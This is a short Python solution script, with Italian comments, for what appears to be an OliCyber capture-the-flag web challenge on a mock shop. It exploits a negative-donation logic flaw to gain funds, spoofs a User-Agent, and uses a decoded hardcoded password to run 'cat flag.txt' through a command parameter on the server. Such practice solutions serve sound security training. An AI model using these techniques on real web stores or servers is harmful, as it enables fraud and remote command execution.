# pip3 install requests
import requests
import secrets

url = "http://itasecshop.challs.olicyber.it/"

# c'è una API /cats sul sito che controlla se hai comprato le prime due flag
# infatti vanno finite le due challenge precedenti
# il codice poi chiede una password segreta, ma non è cifrata in alcun modo
# infatti basta eseguire operazioni inverse o decodificare con cyberchef:

# ---P4ssw0rd$$$$$$uperSicura@@###!meaw---
# la richiesta /cats?psw=---P4ssw0rd%24%24%24%24%24%24uperSicura%40%40%23%23%23%21meaw---&cmd=ls 
# permette di leggere i file presenti nella cartella, dove c'è anche flag.txt
# con questo script riceviamo la flag dal server

def priviRegistrazione():
    username = secrets.token_hex(32)
    password = secrets.token_hex(32)
    session = requests.Session()
    session.post(url + "/register",
                 data={"user": username, "psw": password}).text
    return session

def priviDonazione(session, price):
    session.post(url + "/store/donate", data={"price": str(price)})

def priviCompere(session, item):
    return session.post(url + f"/store/{item}/buy", headers={'User-Agent': 'Samsung Smart Fridge 2.0'}).text

def main():
    session = priviRegistrazione()
    priviDonazione(session, -100000000000000000)
    priviCompere(session, 1)
    priviCompere(session, 5)
    print(session.get(url + "/cats?psw=---P4ssw0rd%24%24%24%24%24%24uperSicura%40%40%23%23%23%21meaw---&cmd=cat+flag.txt").text)

if __name__ == "__main__":
    main()